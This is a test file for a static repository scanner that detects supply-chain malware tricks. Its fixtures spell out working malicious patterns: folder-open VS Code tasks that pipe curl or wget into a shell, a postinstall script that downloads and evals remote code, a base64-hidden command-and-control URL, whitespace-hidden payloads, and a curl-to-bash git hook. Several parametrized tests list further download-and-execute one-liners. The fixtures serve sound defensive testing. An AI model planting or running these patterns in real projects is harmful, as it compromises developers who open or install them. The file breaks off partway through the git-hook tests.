"""Static read of a repo: S1-S6 and S10. Every fixture is a small fake repo; nothing is run."""

import base64
import json

import pytest

from app.rules.engine import decide, load_table
from app.static_scan import repo_scan
from app.static_scan.files import RepoFiles, from_dict
from app.static_scan.repo_scan import scan_repo

CHECK_IDS = ["S1_runs_on_folder_open", "S2_install_script", "S3_install_fetches_remote_code",
             "S4_obfuscated_code", "S5_hidden_urls", "S6_git_hooks", "S10_runs_downloaded_code"]

C2_URL = "http://147.124.212.125:1224/api/service/token"
C2_B64 = base64.b64encode(C2_URL.encode()).decode()
HUSKY_HEADER = '#!/usr/bin/env sh\n. "$(dirname -- "$0")/_/husky.sh"\n\n'


def pkg(**scripts) -> str:
    return json.dumps({"name": "demo", "version": "1.0.0", "scripts": scripts})


def finding(files: dict[str, str], check: str):
    return {f.check: f for f in scan_repo(from_dict(files))}[check]


def status(files: dict[str, str], check: str) -> str:
    return finding(files, check).status


def with_skipped(files: dict[str, str], skipped: dict[str, int]) -> RepoFiles:
    """A repo where some files were listed but not read (too big)."""
    sizes = {p: len(t.encode()) for p, t in files.items()} | skipped
    return RepoFiles(name="test/repo", texts=files, sizes=sizes, skipped=list(skipped))


# ---------------------------------------------------------------- fixtures modeled on real campaigns

MALICIOUS = {
    ".vscode/tasks.json": """{
  // Contagious Interview style: one command per OS, all hidden from the terminal
  "version": "2.0.0",
  "tasks": [
    {
      "label": "eslint-check",
      "type": "shell",
      "osx": {"command": "curl -s 'https://vscode-settings.example/mac?flag=5' | sh"},
      "linux": {"command": "wget -qO- 'https://vscode-settings.example/linux?flag=5' | sh"},
      "windows": {"command": "curl https://vscode-settings.example/win?flag=5 | cmd"},
      "presentation": {"reveal": "never", "echo": false, "close": true,},
      "runOptions": {"runOn": "folderOpen"},
    },
  ],
}
""",
    "package.json": pkg(start="node server/index.js", postinstall="node scripts/setup.js"),
    "scripts/setup.js": (
        "const https = require('https');\n"
        "https.get('https://cdn.example-update.net/p.js', (res) => {\n"
        "  let body = '';\n"
        "  res.on('data', (chunk) => { body += chunk; });\n"
        "  res.on('end', () => { eval(body); });\n"
        "});\n"),
    "server/config/index.js": (
        "const axios = require('axios');\n"
        f"const src = atob('{C2_B64}');\n"
        "exports.getCookie = async () => {\n"
        "  axios.get(src).then((res) => {\n"
        "    const errorHandler = new Function('require', res.data.cookie);\n"
        "    errorHandler(require);\n"
        "  });\n"
        "};\n"),
    "server/routes/auth.js": (
        "const express = require('express');\n"
        "const router = express.Router();" + " " * 300
        + "global['r']=require;(function(){var a='aHR0cHM6Ly94';})()\n"
        "module.exports = router;\n"),
    ".husky/pre-commit": HUSKY_HEADER + "curl -s https://hooks.example-cdn.net/pc.sh | bash\n",
}

BENIGN = {
    "package.json": json.dumps({
        "name": "vite-react-app", "private": True, "type": "module",
        "scripts": {"dev": "vite", "build": "tsc && vite build", "lint": "eslint .", "preview": "vite preview",
                    "prepare": "husky install"},
        "dependencies": {"react": "^18.2.0", "react-dom": "^18.2.0"},
        "devDependencies": {"husky": "^8.0.3", "lint-staged": "^15.0.0", "vite": "^5.0.0"},
        "lint-staged": {"*.{ts,tsx}": "eslint --fix"},
    }, indent=2),
    ".husky/pre-commit": HUSKY_HEADER + "npx lint-staged\n",
    ".husky/commit-msg": HUSKY_HEADER + 'npx --no -- commitlint --edit "$1"\n',
    ".vscode/tasks.json": """{
  // See https://go.microsoft.com/fwlink/?LinkId=733558
  "version": "2.0.0",
  "tasks": [
    {"label": "build", "type": "npm", "script": "build", "group": {"kind": "build", "isDefault": true},},
  ],
}
""",
    "index.html": '<!doctype html><html><body><div id="root"></div><script type="module" src="/src/main.tsx"></script></body></html>',
    "src/main.tsx": (
        "import React from 'react';\nimport ReactDOM from 'react-dom/client';\nimport App from './App';\n"
        "ReactDOM.createRoot(document.getElementById('root')!).render(<App />);\n"),
    "src/App.tsx": (
        "import { useEffect, useState } from 'react';\n"
        "export default function App() {\n"
        "  const [items, setItems] = useState([]);\n"
        "  useEffect(() => { fetch('/api/items').then(r => r.json()).then(setItems); }, []);\n"
        "  const saved = JSON.parse(localStorage.getItem('prefs') || '{}');\n"
        "  return <ul>{items.map((i: any) => <li key={i.id}>{i.name}</li>)}</ul>;\n"
        "}\n"),
    "src/index.css": ".logo{background:url(data:image/png;base64,"
                     + base64.b64encode(b"\x89PNG\r\n\x1a\n" + bytes(range(256)) * 8).decode() + ")}\n",
    "dist/assets/index-4f2a.min.js": "!function(e){" + "var t=e.a+e.b,n=t*2;" * 3000 + "}(window);",
    "package-lock.json": json.dumps({"lockfileVersion": 3, "packages": {
        f"node_modules/pkg{i}": {"version": "1.0.0", "integrity": "sha512-" + base64.b64encode(bytes([i]) * 64).decode()}
        for i in range(60)}}, indent=2),
    "README.md": "# Demo\n\nRun `npm install` then `npm run dev`. See https://vitejs.dev for docs.\n",
}


# ---------------------------------------------------------------- the whole scan

class TestScanRepo:
    def test_one_finding_per_check_in_order(self):
        findings = scan_repo(from_dict(BENIGN))
        assert [f.check for f in findings] == CHECK_IDS

    def test_every_check_is_in_the_rules_table(self):
        table = load_table()
        assert all(cid in table.checks and table.checks[cid].layer == "static" for cid in CHECK_IDS)

    def test_empty_repo_is_all_clear(self):
        assert {f.status for f in scan_repo(from_dict({}))} == {"clear"}

    def test_malicious_repo_hits_every_check(self):
        findings = scan_repo(from_dict(MALICIOUS))
        assert {f.check: f.status for f in findings} == {cid: "hit" for cid in CHECK_IDS}

    def test_benign_repo_is_all_clear(self):
        findings = scan_repo(from_dict(BENIGN))
        assert {f.check: f.status for f in findings} == {cid: "clear" for cid in CHECK_IDS}

    def test_a_crashing_check_becomes_unknown(self, monkeypatch):
        def boom(files):
            raise RecursionError("deep")
        monkeypatch.setattr(repo_scan, "CHECKS", (("S4_obfuscated_code", boom),) + repo_scan.CHECKS[1:])
        findings = scan_repo(from_dict(BENIGN))
        assert findings[0].check == "S4_obfuscated_code" and findings[0].status == "unknown"
        assert "RecursionError" in findings[0].evidence[0].summary
        assert all(f.status == "clear" for f in findings[1:])

    def test_a_single_uploaded_file(self):
        """The pipeline scans an upload as a one-file repo and keeps S4, S5 and S10."""
        loader = MALICIOUS["server/config/index.js"]
        found = {f.check: f.status for f in scan_repo(from_dict({"Invoice_2025.js": loader}))}
        assert found["S10_runs_downloaded_code"] == "hit" and found["S5_hidden_urls"] == "hit"
        assert found["S1_runs_on_folder_open"] == found["S2_install_script"] == "clear"

    def test_script_without_extension_is_read_by_its_shebang(self):
        files = {"bin/update": "#!/usr/bin/env node\n" + OBFUSCATED_JS, "bin/notes": OBFUSCATED_JS}
        f = finding(files, "S4_obfuscated_code")
        assert f.status == "hit" and [e.source for e in f.evidence] == ["bin/update"]

    def test_evidence_is_short_and_names_the_file(self):
        for f in scan_repo(from_dict(MALICIOUS)):
            for e in f.evidence:
                assert e.quote is None or len(e.quote) <= 200
                assert e.source is None or e.source in MALICIOUS


class TestEndToEnd:
    def test_malicious_repo_is_red(self):
        verdict = decide(scan_repo(from_dict(MALICIOUS)), {"repo"})
        assert verdict.color == "red"
        assert verdict.reason == "hard_trigger"  # S3
        assert verdict.score >= 30 + 10 + 20 + 15 + 10 + 40

    def test_malicious_repo_is_red_on_points_alone_without_the_install_script(self):
        files = {k: v for k, v in MALICIOUS.items() if k not in {"package.json", "scripts/setup.js"}}
        verdict = decide(scan_repo(from_dict(files)), {"repo"})
        assert (verdict.color, verdict.reason) == ("red", "score")
        assert verdict.score >= 50

    def test_benign_repo_is_green(self):
        verdict = decide(scan_repo(from_dict(BENIGN)), {"repo"})
        assert (verdict.color, verdict.reason, verdict.score) == ("green", "no_flags", 0)
        assert set(CHECK_IDS).isdisjoint(verdict.unknown)


# ---------------------------------------------------------------- S1 folder open

class TestFolderOpen:
    CHECK = "S1_runs_on_folder_open"

    def test_campaign_task_shows_every_os_command(self):
        f = finding(MALICIOUS, self.CHECK)
        assert f.status == "hit"
        quotes = {e.quote for e in f.evidence}
        assert "curl -s 'https://vscode-settings.example/mac?flag=5' | sh" in quotes
        assert any("wget" in q for q in quotes) and any("| cmd" in q for q in quotes)
        assert f.evidence[0].summary.startswith(".vscode/tasks.json runs a command when the folder opens")
        assert {"on macOS", "on Linux", "on Windows"} <= {s for e in f.evidence for s in
                                                         ("on macOS", "on Linux", "on Windows") if s in e.summary}

    def test_command_and_args_are_shown(self):
        tasks = {"version": "2.0.0", "tasks": [{"label": "setup", "type": "shell", "command": "node",
                                                 "args": [".vscode/x.js", {"value": "--quiet", "quoting": "escape"}],
                                                 "runOptions": {"runOn": "folderOpen"}}]}
        f = finding({".vscode/tasks.json": json.dumps(tasks)}, self.CHECK)
        assert f.status == "hit" and f.evidence[0].quote == "node .vscode/x.js --quiet"

    def test_task_it_depends_on_is_shown(self):
        tasks = {"tasks": [{"label": "init", "dependsOn": ["fetch"], "runOptions": {"runOn": "folderOpen"}},
                           {"label": "fetch", "type": "shell", "command": "curl -s https://x.example/a | sh"}]}
        f = finding({".vscode/tasks.json": json.dumps(tasks)}, self.CHECK)
        assert f.status == "hit"
        assert any(e.quote == "curl -s https://x.example/a | sh" and "first runs" in e.summary for e in f.evidence)

    def test_runon_inside_an_os_block(self):
        tasks = {"tasks": [{"label": "x", "windows": {"command": "powershell -c iwr x | iex",
                                                       "runOptions": {"runOn": "folderOpen"}}}]}
        assert status({".vscode/tasks.json": json.dumps(tasks)}, self.CHECK) == "hit"

    def test_command_padded_far_right_is_called_out(self):
        text = ('{"version": "2.0.0", "tasks": [{"label": "lint", "type": "shell",' + " " * 400
                + '"command": "node .vscode/settings.js", "runOptions": {"runOn": "folderOpen"}}]}')
        f = finding({".vscode/tasks.json": text}, self.CHECK)
        assert f.status == "hit"
        assert any("400 spaces to the right" in e.summary for e in f.evidence)

    def test_malformed_file_with_folder_open_still_hits(self):
        text = '{"tasks": [{"label": "x", "command": "bash .vscode/run.sh", "runOptions": {"runOn": "folderOpen"} '
        f = finding({".vscode/tasks.json": text}, self.CHECK)
        assert f.status == "hit" and f.evidence[0].quote == "bash .vscode/run.sh"
        assert "malformed" in f.evidence[0].summary

    def test_code_workspace_tasks(self):
        ws = {"folders": [{"path": "."}], "tasks": {"version": "2.0.0", "tasks": [
            {"label": "x", "command": "node a.js", "runOptions": {"runOn": "folderOpen"}}]}}
        assert status({"project.code-workspace": json.dumps(ws)}, self.CHECK) == "hit"

    def test_settings_that_skip_the_prompt_are_mentioned(self):
        tasks = {"tasks": [{"label": "x", "command": "node a.js", "runOptions": {"runOn": "folderOpen"}}]}
        f = finding({".vscode/tasks.json": json.dumps(tasks),
                     ".vscode/settings.json": '{\n  // keep it quiet\n  "task.allowAutomaticTasks": "on",\n}'},
                    self.CHECK)
        assert any("settings.json" in e.summary for e in f.evidence)

    def test_normal_build_task_is_clear(self):
        assert status(BENIGN, self.CHECK) == "clear"

    def test_default_run_on_is_clear(self):
        tasks = {"tasks": [{"label": "x", "command": "npm test", "runOptions": {"runOn": "default"}}]}
        assert status({".vscode/tasks.json": json.dumps(tasks)}, self.CHECK) == "clear"

    def test_no_tasks_file_is_clear(self):
        f = finding({"README.md": "hi"}, self.CHECK)
        assert f.status == "clear" and "No VS Code tasks file" in f.evidence[0].summary

    def test_tasks_file_too_big_is_unknown(self):
        files = with_skipped({"README.md": "hi"}, {".vscode/tasks.json": 3_000_000})
        f = {x.check: x for x in scan_repo(files)}[self.CHECK]
        assert f.status == "unknown" and ".vscode/tasks.json" in f.evidence[0].summary
        assert "too big" in f.evidence[0].summary


class TestJsonc:
    def test_comments_and_trailing_commas(self):
        from app.static_scan.jsonc import loads_jsonc
        text = """{
          // line comment
          "url": "https://example.com/a//b", /* block
          comment */ "glob": "src/**/*.ts",
          "esc": "a \\" // still a string",
          "list": [1, 2, 3,],
        }"""
        assert loads_jsonc(text) == {"url": "https://example.com/a//b", "glob": "src/**/*.ts",
                                     "esc": 'a " // still a string', "list": [1, 2, 3]}

    def test_unterminated_block_comment(self):
        from app.static_scan.jsonc import strip_jsonc
        assert strip_jsonc('{"a": 1} /* never closed').strip() == '{"a": 1}'


# ---------------------------------------------------------------- S2 install scripts

class TestInstallScript:
    CHECK = "S2_install_script"

    def test_postinstall_running_a_repo_file_hits(self):
        f = finding({"package.json": pkg(postinstall="node scripts/setup.js")}, self.CHECK)
        assert f.status == "hit"
        assert f.evidence[0].summary == "package.json runs a command when the project is installed (postinstall)"
        assert f.evidence[0].quote == "node scripts/setup.js"

    @pytest.mark.parametrize("hook", ["preinstall", "install", "postinstall", "prepare", "prepack", "prepublish"])
    def test_every_lifecycle_hook_counts(self, hook):
        assert status({"package.json": pkg(**{hook: "node x.js"})}, self.CHECK) == "hit"

    def test_start_and_test_scripts_dont_count(self):
        assert status({"package.json": pkg(start="node server.js", test="jest")}, self.CHECK) == "clear"

    @pytest.mark.parametrize("command", [
        "husky", "husky install", "husky install .husky", "is-ci || husky install", "npx husky install",
        "patch-package", "prisma generate", "npx prisma generate --schema=./db/schema.prisma", "ngcc",
        "ngcc --properties es2015 browser module main", "tsc", "tsc -p tsconfig.build.json", "npm run build",
        "lerna bootstrap", "node-gyp rebuild", "electron-builder install-app-deps", "cd .. && husky install client/.husky",
        "simple-git-hooks", "npx only-allow pnpm", "svelte-kit sync", "nuxt prepare", "husky || true",
        "HUSKY=0 husky install", "cross-env CI=1 husky install", "yarn husky install",
    ])
    def test_known_benign_commands_are_clear(self, command):
        files = {"package.json": pkg(prepare=command, build="tsc && vite build")}
        f = finding(files, self.CHECK)
        assert f.status == "clear", command
        assert "common tools" in f.evidence[0].summary  # the evidence still says what runs

    def test_benign_tool_chained_with_something_else_hits(self):
        f = finding({"package.json": pkg(prepare="husky install && curl -s https://x.example/a | sh")}, self.CHECK)
        assert f.status == "hit"

    def test_npm_run_follows_the_script(self):
        f = finding({"package.json": pkg(prepare="npm run build", build="node scripts/build.js")}, self.CHECK)
        assert f.status == "hit" and "node scripts/build.js" in f.evidence[0].quote

    def test_npm_run_of_a_missing_script_is_clear(self):
        assert status({"package.json": pkg(prepare="npm run build")}, self.CHECK) == "clear"

    def test_script_loop_does_not_hang(self):
        assert status({"package.json": pkg(prepare="npm run a", a="npm run b", b="npm run a")}, self.CHECK) == "clear"

    def test_workspace_package_counts(self):
        files = {"package.json": pkg(dev="vite"), "packages/api/package.json": pkg(postinstall="node setup.js")}
        f = finding(files, self.CHECK)
        assert f.status == "hit" and f.evidence[0].source == "packages/api/package.json"

    def test_package_json_with_a_byte_order_mark(self):
        assert status({"package.json": chr(0xFEFF) + pkg(postinstall="node s.js")}, self.CHECK) == "hit"

    def test_broken_package_json_is_still_read(self):
        text = '{"name": "x", "scripts": {"postinstall": "node s.js",}}'
        assert status({"package.json": text}, self.CHECK) == "hit"

    def test_setup_py_with_cmdclass_install_hits(self):
        setup = ("from setuptools import setup\nfrom setuptools.command.install import install as _install\n"
                 "class PostInstall(_install):\n    def run(self):\n        _install.run(self)\n"
                 "setup(name='x', cmdclass={'install': PostInstall})\n")
        f = finding({"setup.py": setup}, self.CHECK)
        assert f.status == "hit" and "install step" in f.evidence[0].summary

    def test_setup_py_cmdclass_by_name_and_dict(self):
        setup = ("from setuptools import setup\nfrom setuptools.command.develop import develop\n"
                 "class D(develop):\n    pass\ncmds = dict(develop=D)\nsetup(name='x', cmdclass=cmds)\n")
        assert status({"setup.py": setup}, self.CHECK) == "hit"

    def test_setup_py_without_cmdclass_is_clear(self):
        setup = "from setuptools import setup, find_packages\nsetup(name='x', version='1.0', packages=find_packages())\n"
        assert status({"setup.py": setup}, self.CHECK) == "clear"

    def test_setup_py_overriding_build_ext_only_is_clear(self):
        setup = ("from setuptools import setup\nfrom setuptools.command.build_ext import build_ext\n"
                 "class B(build_ext):\n    pass\nsetup(name='x', cmdclass={'build_ext': B})\n")
        assert status({"setup.py": setup}, self.CHECK) == "clear"

    def test_python2_setup_py_falls_back_to_text(self):
        setup = "print 'hi'\nsetup(name='x', cmdclass={'install': Evil})\n"
        assert status({"setup.py": setup}, self.CHECK) == "hit"

    def test_pyproject_in_tree_backend_hits(self):
        toml = '[build-system]\nrequires = []\nbuild-backend = "backend"\nbackend-path = ["_build"]\n'
        assert status({"pyproject.toml": toml}, self.CHECK) == "hit"

    def test_ordinary_pyproject_is_clear(self):
        toml = '[build-system]\nrequires = ["hatchling"]\nbuild-backend = "hatchling.build"\n[project]\nname = "x"\n'
        assert status({"pyproject.toml": toml}, self.CHECK) == "clear"

    def test_package_json_too_big_is_unknown(self):
        files = with_skipped({"README.md": "hi"}, {"package.json": 2_000_000})
        f = {x.check: x for x in scan_repo(files)}[self.CHECK]
        assert f.status == "unknown" and "package.json" in f.evidence[0].summary


# ---------------------------------------------------------------- S3 install fetches remote code

class TestInstallFetch:
    CHECK = "S3_install_fetches_remote_code"

    def test_postinstall_file_with_https_get_and_eval(self):
        f = finding(MALICIOUS, self.CHECK)
        assert f.status == "hit"
        assert f.evidence[0].summary.startswith("package.json postinstall runs scripts/setup.js, which downloads code")
        assert "eval" in f.evidence[0].summary and "eval(body)" in f.evidence[0].quote

    @pytest.mark.parametrize("command", [
        "curl -s https://x.example/i.sh | sh",
        "wget -qO- https://x.example/i.sh | bash",
        "bash -c \"$(curl -fsSL https://x.example/i.sh)\"",
        "powershell -c \"iwr https://x.example/a.ps1 | iex\"",
        "curl -o /tmp/a.js https://x.example/a.js && node /tmp/a.js",
        "curl -fsSL https://x.example/install | sh -s -- --yes",
        "node -e \"require('https').get('https://x.example', r => {let d='';r.on('data',c=>d+=c);r.on('end',()=>eval(d))})\"",
    ])
    def test_inline_commands(self, command):
        assert status({"package.json": pkg(preinstall=command)}, self.CHECK) == "hit", command

    def test_through_npm_run(self):
        files = {"package.json": pkg(postinstall="npm run setup", setup="curl -s https://x.example/a | sh")}
        assert status(files, self.CHECK) == "hit"

    def test_through_a_local_require(self):
        files = {"package.json": pkg(postinstall="node scripts/install"),
                 "scripts/install.js": "require('./lib/run.js');\n",
                 "scripts/lib/run.js": "const axios = require('axios');\naxios.get(u).then(r => eval(r.data));\n"}
        f = finding(files, self.CHECK)
        assert f.status == "hit" and f.evidence[0].source == "scripts/lib/run.js"

    def test_setup_py_that_downloads_and_execs(self):
        setup = ("import urllib.request\nfrom setuptools import setup\n"
                 "exec(urllib.request.urlopen('https://x.example/p.py').read())\nsetup(name='x')\n")
        f = finding({"setup.py": setup}, self.CHECK)
        assert f.status == "hit" and "setup.py" in f.evidence[0].summary

    def test_install_script_without_network_is_clear(self):
        files = {"package.json": pkg(postinstall="node scripts/copy.js"),
                 "scripts/copy.js": "const fs = require('fs');\nfs.copyFileSync('a', 'b');\n"}
        assert status(files, self.CHECK) == "clear"

    def test_download_without_running_it_is_clear(self):
        files = {"package.json": pkg(postinstall="node scripts/check.js"),
                 "scripts/check.js": "require('https').get('https://registry.npmjs.org/x', r => console.log(r.statusCode));\n"}
        assert status(files, self.CHECK) == "clear"

    def test_download_piped_into_a_repo_script_is_clear(self):
        files = {"package.json": pkg(postinstall="curl -s https://api.github.com/repos/a/b | node scripts/parse.js"),
                 "scripts/parse.js": "let s='';process.stdin.on('data',d=>s+=d).on('end',()=>console.log(JSON.parse(s).name));\n"}
        assert status(files, self.CHECK) == "clear"

    def test_regex_exec_is_not_running_code(self):
        files = {"package.json": pkg(postinstall="node scripts/v.js"),
                 "scripts/v.js": "fetch(u).then(r => r.text()).then(t => /v(\\d+)/.exec(t));\n"}
        assert status(files, self.CHECK) == "clear"

    def test_benign_repo_is_clear(self):
        assert status(BENIGN, self.CHECK) == "clear"

    def test_unreadable_install_file_is_unknown(self):
        files = with_skipped({"package.json": pkg(postinstall="node scripts/setup.js")},
                             {"scripts/setup.js": 5_000_000})
        f = {x.check: x for x in scan_repo(files)}[self.CHECK]
        assert f.status == "unknown" and "scripts/setup.js" in f.evidence[0].summary


# ---------------------------------------------------------------- S4 obfuscation

OBFUSCATED_JS = ("var _0x4f2a=['log','Hello'];(function(_0x1b2c3d,_0x4f2a1e){var _0x5c6d=function(_0x7e8f){"
                 "while(--_0x7e8f){_0x1b2c3d['push'](_0x1b2c3d['shift']());}};_0x5c6d(++_0x4f2a1e);}(_0x4f2a,0x1f4));"
                 "var _0x5c6d=function(_0x1b2c3d,_0x4f2a1e){_0x1b2c3d=_0x1b2c3d-0x0;return _0x4f2a[_0x1b2c3d];};"
                 "console[_0x5c6d('0x0')](_0x5c6d('0x1'));")


class TestObfuscation:
    CHECK = "S4_obfuscated_code"

    def test_javascript_obfuscator_names(self):
        f = finding({"server/utils/helper.js": OBFUSCATED_JS}, self.CHECK)
        assert f.status == "hit" and "scrambled names like _0x" in f.evidence[0].summary

    def test_a_few_hex_names_are_not_enough(self):
        assert status({"src/a.js": "var _0x1a2b = 1, _0x3c4d = 2;\n"}, self.CHECK) == "clear"

    def test_strong_signals_count_inside_bundles(self):
        assert status({"dist/app.min.js": OBFUSCATED_JS}, self.CHECK) == "hit"

    @pytest.mark.parametrize("code", [
        "eval(atob('Y29uc29sZS5sb2coMSk='));",
        "new Function(atob(payload))();",
        "eval(Buffer.from(s, 'base64').toString());",
        "import base64\nexec(base64.b64decode('cHJpbnQoMSk='))\n",
        "import zlib\nexec(zlib.decompress(blob))\n",
        "import marshal\ncode = marshal.loads(data)\n",
        "_ = lambda __ : __import__('zlib').decompress(__import__('base64').b64decode(__[::-1]))\n",
        "echo cHJpbnQ= | base64 -d | bash\n",
        "powershell -NoP -W Hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkA\n",
    ])
    def test_running_decoded_strings(self, code):
        ext = ".py" if "import" in code or code.startswith("_") else ".sh" if "bash" in code else \
            ".ps1" if "powershell" in code else ".js"
        f = finding({f"lib/x{ext}": code}, self.CHECK)
        assert f.status == "hit", code
        assert "decodes a hidden string" in f.evidence[0].summary

    def test_payload_after_300_spaces(self):
        f = finding(MALICIOUS, self.CHECK)
        hidden = [e for e in f.evidence if "300 spaces to the right" in e.summary]
        assert hidden and hidden[0].source == "server/routes/auth.js"
        assert hidden[0].quote.startswith("const router = express.Router(); … global['r']=require")

    def test_whitespace_hiding_counts_in_bundles_too(self):
        assert status({"build/x.js": "a();" + "\t" * 200 + "require('child_process').exec(x)\n"}, self.CHECK) == "hit"

    def test_149_spaces_or_trailing_spaces_are_clear(self):
        files = {"src/a.js": "const a = 1;" + " " * 149 + "eval(x);\n", "src/b.js": "const b = 2;" + " " * 500 + "\n"}
        assert status(files, self.CHECK) == "clear"

    def test_long_char_code_list(self):
        codes = ",".join(str(ord(c)) for c in "console.log('hidden message here');")
        f = finding({"src/a.js": f"var s = String.fromCharCode({codes});\n"}, self.CHECK)
        assert f.status == "hit" and "character codes" in f.evidence[0].summary

    def test_python_chr_list(self):
        codes = ", ".join(str(ord(c)) for c in "import os; os.system('id')")
        assert status({"a.py": f"s = ''.join(map(chr, [{codes}]))\n"}, self.CHECK) == "hit"

    def test_escaped_string(self):
        hidden = "".join(f"\\x{ord(c):02x}" for c in "require('child_process').exec('curl x | sh') // padding")
        f = finding({"src/a.js": f'var s = "{hidden}";\n'}, self.CHECK)
        assert f.status == "hit" and "escape codes" in f.evidence[0].summary

    def test_weak_signals_dont_count_in_bundles(self):
        codes = ",".join(str(ord(c)) for c in "console.log('hidden message here');")
        hidden = "".join(f"\\x{ord(c):02x}" for c in "require('child_process').exec('curl x | sh') // padding")
        files = {"dist/bundle.min.js": f"var s=String.fromCharCode({codes});var t=\"{hidden}\";",
                 "public/vendor/lib.js": f"var s=String.fromCharCode({codes});"}
        assert status(files, self.CHECK) == "clear"

    def test_binary_bytes_literal_is_clear(self):
        blob = "".join(f"\\x{b:02x}" for b in "{FF9A3F03-56EF-4613-BDD5-5A41C1D07246}".encode("utf-16-le"))
        assert status({"lib/crypto.py": f'PRIMARY = b"{blob}"\n'}, self.CHECK) == "clear"

    def test_type_declarations_too_big_to_read_dont_make_it_unknown(self):
        files = with_skipped({"src/a.js": "x()"}, {"types/lib.dom.d.ts": 2_300_000})
        assert {x.check: x for x in scan_repo(files)}["S4_obfuscated_code"].status == "clear"

    def test_non_ascii_unicode_escapes_are_clear(self):
        text = "".join(f"\\u{0x4e00 + i:04x}" for i in range(80))
        assert status({"src/locale/zh.js": f'export default {{ title: "{text}" }};\n'}, self.CHECK) == "clear"

    def test_minified_bundle_with_long_lines_is_clear(self):
        assert status({"dist/bundle.min.js": BENIGN["dist/assets/index-4f2a.min.js"]}, self.CHECK) == "clear"

    def test_benign_repo_is_clear(self):
        assert status(BENIGN, self.CHECK) == "clear"

    def test_unread_source_file_is_unknown_but_unread_bundle_is_not(self):
        files = with_skipped({"src/a.js": "x()"}, {"server/config/index.js": 1_500_000})
        f = {x.check: x for x in scan_repo(files)}["S4_obfuscated_code"]
        assert f.status == "unknown" and "server/config/index.js" in f.evidence[0].summary
        files = with_skipped({"src/a.js": "x()"}, {"dist/app.js": 4_000_000})
        assert {x.check: x for x in scan_repo(files)}["S4_obfuscated_code"].status == "clear"


# ---------------------------------------------------------------- S5 hidden URLs

class TestHiddenUrls:
    CHECK = "S5_hidden_urls"

    def test_base64_url_shows_the_decoded_address(self):
        f = finding(MALICIOUS, self.CHECK)
        assert f.status == "hit"
        assert C2_URL in f.evidence[0].summary and "base64" in f.evidence[0].summary
        assert f.evidence[0].quote == C2_B64 and f.evidence[0].source == "server/config/index.js"

    @pytest.mark.parametrize("plain", ["https://api.stock-price.example/v2/feed", "wss://ws.example-api.net:8443/s",
                                       "95.164.17.24:1244", "Connect to 172.86.98.240 now"])
    def test_base64_in_env_file(self, plain):
        env = f"PORT=3000\nDEV_API_KEY={base64.b64encode(plain.encode()).decode()}\n"
        assert status({".env": env}, self.CHECK) == "hit", plain

    def test_url_safe_and_unpadded_base64(self):
        token = base64.urlsafe_b64encode(b"https://evil.example/?a=1&b=~~~").decode().rstrip("=")
        assert status({"src/a.js": f"const t = '{token}';"}, self.CHECK) == "hit"

    def test_double_encoded(self):
        twice = base64.b64encode(base64.b64encode(b"http://10.1.2.3:8080/x")).decode()
        f = finding({"config.js": f"module.exports = '{twice}';"}, self.CHECK)
        assert f.status == "hit" and "http://10.1.2.3:8080/x" in f.evidence[0].summary

    def test_hex_string(self):
        hexed = b"https://evil.example/payload".hex()
        assert status({"a.py": f"u = bytes.fromhex('{hexed}').decode()"}, self.CHECK) == "hit"

    def test_escaped_string(self):
        esc = "".join(f"\\x{b:02x}" for b in b"http://evil.example/x")
        assert status({"a.js": f'var u = "{esc}";'}, self.CHECK) == "hit"

    def test_char_code_list(self):
        codes = ",".join(str(b) for b in b"https://evil.example/a")
        f = finding({"a.js": f"var u = String.fromCharCode({codes});"}, self.CHECK)
        assert f.status == "hit" and "https://evil.example/a" in f.evidence[0].summary

    def test_reversed_string(self):
        f = finding({"a.js": "const u = 'a/ipa/elpmaxe.live//:sptth'.split('').reverse().join('');"}, self.CHECK)
        assert f.status == "hit" and "https://evil.example/api/a" in f.evidence[0].summary

    def test_data_uri_images_and_fonts_are_clear(self):
        svg = base64.b64encode(b'<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 1 1"></svg>').decode()
        font = base64.b64encode(b"wOF2" + bytes(range(200))).decode()
        css = (f".a{{background:url(data:image/svg+xml;base64,{svg})}}\n"
               f"@font-face{{src:url('data:font/woff2;charset=utf-8;base64,{font}')}}\n")
        assert status({"src/a.css": css, "src/index.css": BENIGN["src/index.css"]}, self.CHECK) == "clear"

    def test_svg_namespace_without_data_uri_is_clear(self):
        svg = base64.b64encode(b'<svg xmlns="http://www.w3.org/2000/svg" width="24"></svg>').decode()
        assert status({"src/icon.js": f"export const icon = '{svg}';"}, self.CHECK) == "clear"

    def test_lock_files_and_source_maps_are_clear(self):
        hidden = base64.b64encode(b"https://registry.example/pkg").decode()
        files = {"package-lock.json": BENIGN["package-lock.json"].replace("sha512-", f"{hidden} sha512-", 1),
                 "yarn.lock": f"integrity {hidden}\n",
                 "dist/app.js.map": json.dumps({"version": 3, "mappings": hidden, "sourcesContent": [hidden]})}
        assert status(files, self.CHECK) == "clear"

    def test_jwt_is_clear(self):
        def part(d):
            return base64.urlsafe_b64encode(json.dumps(d).encode()).decode().rstrip("=")
        jwt = f"{part({'alg': 'HS256'})}.{part({'iss': 'https://accounts.example.com', 'sub': '1'})}.c2lnbmF0dXJl"
        assert status({"tests/auth.test.js": f"const token = '{jwt}';"}, self.CHECK) == "clear"

    def test_address_also_written_in_plain_is_clear(self):
        enc = base64.b64encode(b"https://api.example.com/v1").decode()
        code = f"expect(btoa('https://api.example.com/v1')).toBe('{enc}');"
        assert status({"tests/a.test.js": code}, self.CHECK) == "clear"

    def test_pem_certificate_is_clear(self):
        line = base64.b64encode(b"\x30\x82" + b"http://crl3.digicert.com/DigiCertGlobalRootCA.crl").decode()
        pem = f"-----BEGIN CERTIFICATE-----\n{line}\n-----END CERTIFICATE-----\n"
        assert status({"certs/ca.txt": pem}, self.CHECK) == "clear"

    def test_local_addresses_and_plain_base64_text_are_clear(self):
        files = {"a.js": f"const a = '{base64.b64encode(b'http://localhost:3000/api').decode()}';\n"
                         f"const b = '{base64.b64encode(b'just some ordinary text').decode()}';\n"
                         f"const c = '{base64.b64encode(b'Mozilla/5.0 Chrome/120.0.0.0 Safari/537.36').decode()}';\n"}
        assert status(files, self.CHECK) == "clear"

    def test_benign_repo_is_clear(self):
        assert status(BENIGN, self.CHECK) == "clear"


# ---------------------------------------------------------------- S6 git hooks

class TestGitHooks:
    CHECK = "S6_git_hooks"

    def test_husky_hook_with_curl_pipe_bash(self):
        f = finding(MALICIOUS, self.CHECK)
        assert f.status == "hit"
        assert f.evidence[0].summary == ".husky/pre-commit downloads from the internet (curl) every time you commit"
